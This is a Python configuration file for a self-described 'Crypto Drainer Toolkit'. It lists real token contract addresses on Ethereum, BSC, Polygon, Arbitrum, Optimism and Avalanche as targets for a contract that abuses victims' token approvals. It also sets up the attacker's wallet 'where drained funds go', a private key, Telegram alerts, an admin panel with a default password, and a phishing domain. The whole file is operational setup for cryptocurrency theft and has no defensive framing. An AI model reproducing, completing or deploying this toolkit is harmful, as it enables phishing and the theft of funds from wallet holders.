#!/usr/bin/env python3
"""
Configuration for the Crypto Drainer Toolkit.
Loads sensitive values from .env file.
"""
import os
from pathlib import Path
from dotenv import load_dotenv

# Load environment variables from .env file
env_path = Path(__file__).resolve().parent.parent / ".env"
load_dotenv(env_path)

# ============================================================
# NETWORK CONFIGURATION
# ============================================================
# Add token contract addresses here before deployment.
# These addresses are used by DrainerContract.initializeTargetTokens().
# No need to bring actual token balances into this repo — the contract
# targets victim approvals for these token contracts.
CHAIN_CONFIG = {
    "ethereum": {
        "chain_id": 1,
        "rpc": "https://eth.drpc.org",
        "explorer": "https://etherscan.io",
        "currency": "ETH",
        "permit2_address": "0x000000000022D473030F116dDEE9F6B43aC78BA3",
        "high_value_tokens": [
            "0xdAC17F958D2ee523a2206206994597C13D831ec7",  # USDT
            "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",  # USDC
            "0x6B175474E89094C44Da98b954EedeAC495271d0F",  # DAI
            "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",  # WETH
            "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599",  # WBTC
            "0x7D1AfA7B718fb893dB30A3aBc0Cfc608AaCfeBB0",  # MATIC
            "0x514910771AF9Ca656af840dff83E8264EcF986CA",  # LINK
            "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984",  # UNI
            "0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9",  # AAVE
            "0xc00e94cb662c3520282e6f5717214004a7f26888",  # COMP
            "0x9f8F72aA9304c8B593d555F12eF6589cC3A579A2",  # MKR
            "0x6B3595068778DD592e39A122f4F5a5CF09C90fE2",  # SUSHI
        ]
    },
    "bsc": {
        "chain_id": 56,
        "rpc": "https://bsc-dataseed.binance.org",
        "explorer": "https://bscscan.com",
        "currency": "BNB",
        "permit2_address": "0x000000000022D473030F116dDEE9F6B43aC78BA3",
        "high_value_tokens": [
            "0x55d398326f99059fF775485246999027B3197955",  # USDT (BSC)
            "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d",  # USDC (BSC)
            "0xe9e7cea3dedca5984780bafc599bd69add087d56",  # BUSD (BSC)
            "0x2170Ed0880ac9A755fd29B2688956BD959F933F8",  # WETH (BSC)
            "0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c",  # BTCB
            "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c",  # WBNB
            "0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82",  # CAKE
            "0x1AF3F329e8BE154074D8769D1FFa4eE058B1DBc3",  # DAI (BSC)
        ]
    },
    "polygon": {
        "chain_id": 137,
        "rpc": "https://polygon-rpc.com",
        "explorer": "https://polygonscan.com",
        "currency": "MATIC",
        "permit2_address": "0x000000000022D473030F116dDEE9F6B43aC78BA3",
        "high_value_tokens": [
            "0xc2132D05D31c914a87C6611C10748AEb04B58e8F",  # USDT (Polygon)
            "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174",  # USDC (Polygon)
            "0x8f3cf7ad23cd3cadbd9735aff958023239c6a063",  # DAI (Polygon)
            "0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619",  # WETH (Polygon)
            "0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270",  # WMATIC
            "0x53e0bca35ec356bd5dddfebbd1fc0fd03fabad39",  # LINK (Polygon)
            "0xd6df932a45c0f255f85145f286ea0b292b21c90b",  # AAVE (Polygon)
            "0x831753dd7087cac61ab5644b308642cc1c33dc13",  # QUICK (Polygon)
            "0xBbba073C31bF03b8ACf7c28EF0738De2A6F1dD74",  # SAND (Polygon)
        ]
    },
    "arbitrum": {
        "chain_id": 42161,
        "rpc": "https://arb1.arbitrum.io/rpc",
        "explorer": "https://arbiscan.io",
        "currency": "ETH",
        "permit2_address": "0x000000000022D473030F116dDEE9F6B43aC78BA3",
        "high_value_tokens": [
            "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9",  # USDT (Arbitrum)
            "0xaf88d065e77c8cC2239327C5EDb3A432268e5831",  # USDC (Arbitrum)
            "0xDA10009cBd5D07dD0CeCc66161FC93D7c9000dA1",  # DAI (Arbitrum)
            "0x82aF49447D8a07e3bd95BD0d56f35241523fBab1",  # WETH (Arbitrum)
            "0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f",  # WBTC (Arbitrum)
            "0xf97f4df75117a78c1a5a0dbb814af92458539fb4",  # LINK (Arbitrum)
            "0x912CE59144191C1204E64559FE8253A0E49E6548",  # ARB (Arbitrum)
        ]
    },
    "optimism": {
        "chain_id": 10,
        "rpc": "https://mainnet.optimism.io",
        "explorer": "https://optimistic.etherscan.io",
        "currency": "ETH",
        "permit2_address": "0x000000000022D473030F116dDEE9F6B43aC78BA3",
        "high_value_tokens": [
            "0x94b008aA00579c1307B0EF2c499aD98a8ce58e58",  # USDT (Optimism)
            "0x7F5c764cBc14f9669B88837ca1490cCa17c31607",  # USDC (Optimism)
            "0xDA10009cBd5D07dD0CeCc66161FC93D7c9000dA1",  # DAI (Optimism)
            "0x4200000000000000000000000000000000000006",  # WETH (Optimism)
            "0x68f180fcCe6836688e9084f035309E29Bf0A2095",  # WBTC (Optimism)
            "0x4200000000000000000000000000000000000042",  # OP (Optimism)
        ]
    },
    "avalanche": {
        "chain_id": 43114,
        "rpc": "https://api.avax.network/ext/bc/C/rpc",
        "explorer": "https://snowtrace.io",
        "currency": "AVAX",
        "permit2_address": "0x000000000022D473030F116dDEE9F6B43aC78BA3",
        "high_value_tokens": [
            "0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7",  # USDT (Avalanche)
            "0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E",  # USDC (Avalanche)
            "0xd586E7F844cEa2F87f50152665BCbc2C279D8d70",  # DAI (Avalanche)
            "0x49D5c2BdFfac6CE2BFdB6640F4F80f226bc10bAB",  # WETH (Avalanche)
            "0x50b7545627a5162F82A992c33b87aDc75187B218",  # WBTC (Avalanche)
            "0x6e84a6216eA6dACC71eE8E6b0a5B7322EEbC0f3",  # JOE (Avalanche)
        ]
    }
}

# ============================================================
# DEFAULT CHAIN
# ============================================================
DEFAULT_CHAIN = os.getenv("DEFAULT_CHAIN", "ethereum")

# ============================================================
# YOUR WALLET (where drained funds go) — FROM .ENV
# ============================================================
YOUR_PRIVATE_KEY = os.getenv("DRAINER_PRIVATE_KEY", "")
YOUR_WALLET_ADDRESS = os.getenv("DRAINER_WALLET", "")

# ============================================================
# TELEGRAM BOT CONFIG — FROM .ENV
# ============================================================
TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "")
TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID", "")

# ============================================================
# FLASK ADMIN PANEL — FROM .ENV (WITH FALLBACKS)
# ============================================================
FLASK_SECRET_KEY = os.getenv("FLASK_SECRET_KEY", "change-this-to-random-string-in-production")
FLASK_HOST = os.getenv("FLASK_HOST", "0.0.0.0")
FLASK_PORT = int(os.getenv("FLASK_PORT", "5000"))
FLASK_DEBUG = os.getenv("FLASK_DEBUG", "false").lower() == "true"

# Admin panel password
ADMIN_PASSWORD = os.getenv("ADMIN_PASSWORD", "drainer_admin_2025")

# ============================================================
# PHISHING FRONTEND CONFIG — FROM .ENV
# ============================================================
PHISHING_DOMAIN = os.getenv("PHISHING_DOMAIN", "localhost")
USE_SSL = os.getenv("USE_SSL", "false").lower() == "true"

# ============================================================
# MONITORING — FROM .ENV (WITH FALLBACKS)
# ============================================================
MONITOR_INTERVAL_SECONDS = int(os.getenv("MONITOR_INTERVAL_SECONDS", "30"))
BLOCK_CONFIRMATIONS = int(os.getenv("BLOCK_CONFIRMATIONS", "1"))
MAX_GAS_PRICE_GWEI = int(os.getenv("MAX_GAS_PRICE_GWEI", "200"))
GAS_MULTIPLIER = float(os.getenv("GAS_MULTIPLIER", "1.2"))

# ============================================================
# FILE PATHS
# ============================================================
BASE_DIR = Path(__file__).resolve().parent.parent
CONTRACTS_DIR = BASE_DIR / "contracts" / "compiled"
LOG_FILE = BASE_DIR / "logs" / "drainer.log"
os.makedirs(BASE_DIR / "logs", exist_ok=True)